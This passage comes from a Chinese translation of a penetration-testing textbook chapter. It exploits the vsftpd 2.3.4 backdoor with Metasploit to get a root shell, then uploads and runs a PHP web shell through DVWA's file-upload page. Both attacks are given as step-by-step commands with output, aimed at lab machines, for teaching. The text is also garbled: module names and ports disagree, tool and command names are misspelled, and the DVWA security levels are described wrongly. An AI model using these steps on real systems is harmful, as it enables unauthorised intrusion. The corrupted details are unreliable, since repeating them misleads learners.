
模块选项 (`exploit(unix/vsftp/vsftpd_23_backdoor)`)：

| 名称 | 当前设置 | 必须 | 说明 |
|---|---|---|---|
| `RHOSTS` | `192.168.1.224` | 是 | 目标主机、CIDR 范围标识符，或语法为 `'file:<path>'` 的主机 |
| `RPORT` | `21` | 是 | 目标端口 (TCP) |

图 15.17 – 使用 `show options` 确认漏洞

## 420 利用渗透测试进行防御安全

现在一切似乎都已就绪，可以使用以下命令执行漏洞：

```
run
```

现在，如下所示，我们已经拥有了目标机器的完全访问权限。事实上，你也可以看到我们可以在目标（受害者机器）上执行许多命令，例如 `whoami`（这显而易见地显示我们是以 `root` 身份连接的）。此外，我们进行了配置以确认我们正在目标机器上发布命令：

```
msf6 exploit(linux/ftp/vsftpd_24_backdoor) > run

[*] 192.168.1.224:221 - Banner: 23 (vsFTPD 2.3.4)

[*] 192.168.1.224:221 - USER: User Please specify the password.

[*] 192.168.1.224:221 - Backdoor service has been spawned, handling ...

[*] 192.168.1.224:221 - UID: uid=(root) gid=(root)

[*] Found shell.

[*] Command session 1 opened (0.0.0.0 -> 192.168.1.224:6200) at 2021-08-06 02:09:10 -0400
```

```
whoami

root

config

eth0

link:Ethernet HWaddr 00:20:27:f3:8d:9f

net addr:192.168.1.224 broadcast:192.168.1.255 mask:255.255.255.0

net addr:192.168.1.224 broadcast:192.168.1.255 mask:255.255.255.0 scope:global

eth6 addr:00:20:27:f3:8d:9f scope:link

UP BROADCAST MULTICAST MTU:1500 Metric:1

RX packets:70873 errors:9 dropped:0 overruns:0 frame:0

TX packets:2763 errors:0 dropped:0 overruns:0 carrier:0

collisions:0 txuelen:1000

RX bytes:5805524 (5.5 MB) TX bytes:6320444 (6.0 MB)

Interrupt:10 Base address:0x020
```

```
ls

bin

boot

crom

dev

etc

home

itrd

initrd

initrd.img

lib
```

![](img/8c6a6)

现在，让我们打开浏览器并通过以下地址打开 DVWA：`127.0.0.1/DVWA/`

现在你应该能看到 DVWA 的登录页面，如下图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_446_0.png)

图 15.21 – DVWA 登录页面

要登录，只需使用在设置 DVWA 时创建的 `admin` 凭据。
现在你已经进入了，让我们把安全性更改为低（`low`）。要这样做，只需进入左侧菜单并搜索 `DVWA Security`，然后将下拉菜单更改为 `Low` 并点击 `Submit`（提交），如下图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_447_0.png)

## 安全级别

当前安全级别为不可能（`impossible`）。

你可以将安全级别设置为低（`low`）、中（`medium`）、高（`high`）或不可能（`impossible`）。安全级别会改变 DVWA 的漏洞级别。

- 低（`Low`）：此安全级别完全没有任何漏洞，没有任何安全措施。它被用作通过不良好的编码实践如何表现 Web 漏洞的示例，并作为安全初学者的平台。
- 中（`Medium`）：此设置主要为了给用户提供糟糕安全实践的示例，漏洞可能不允许像低级别那样的程度的利用，但它对于那些想要开发自己的利用技术的人来说也是一种挑战。
- 高（`High`）：此级别是中难度的扩展，混合了更困难或替代的糟糕实践，以防止攻击并确保代码安全。
- 不可能（`Impossible`）：此级别用于比较 DVWA v1.9 的安全级别，当时该级别被称为“高”（`high`）。

![](img/8c6a223c57e25ea0cc1593903a1b920f_447_1.png)

图 15.22 – 在 DVWA 中将安全级别调回默认值

至此，我们的目标机器已准备好接受攻击了！

要创建 shell，让我们回到 Kali 并使用以下命令：

```
weebly generate mypassword /home/kali/myshell.php
```

注意 `mypassword` 是我们要创建的 shell 的密码，其余的是 shell 的路径和文件名。在这个示例中，我将其以 `myshell.php` 的名称保存在我的用户目录下。

现在，你可以导航到你的用户目录来确认 shell 已创建，如下：

![](img/8c6a223c57e25ea0cc1593903a1b920f_447_2.png)

图 15.23 – 在 Weebly 上创建的 shell 本地副本

426 利用渗透测试进行防御安全

现在，让我们回到 DVWA 上传我们的 shell。

要这样做，只需进入左侧菜单中的 `File Upload`（文件上传），然后点击 `Browse`（浏览），找到 `myshell.php` 并点击 `Upload`（上传）。

现在，我们需要复制文件在服务器上的位置。要这样做，只需复制 URL 的部分（`http://127.0.0.1/DVWA`）以及成功上传消息中高亮的路径（`/hackable/uploads/myshell.php`），如下图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_448_0.png)

现在，路径看起来应该是这样：

```
http://127.0.0.1/DVWA/hackable/uploads/myshell.php
```

现在，让我们再次打开 Kali Linux 的控制台使用以下命令执行 shell（注意，我们基本上是在服务器路径后加上了运行 shell 的密码）：

```
weebly http://127.0.0.1/DVWA/hackable/uploads/myshell.php

mypassword
```
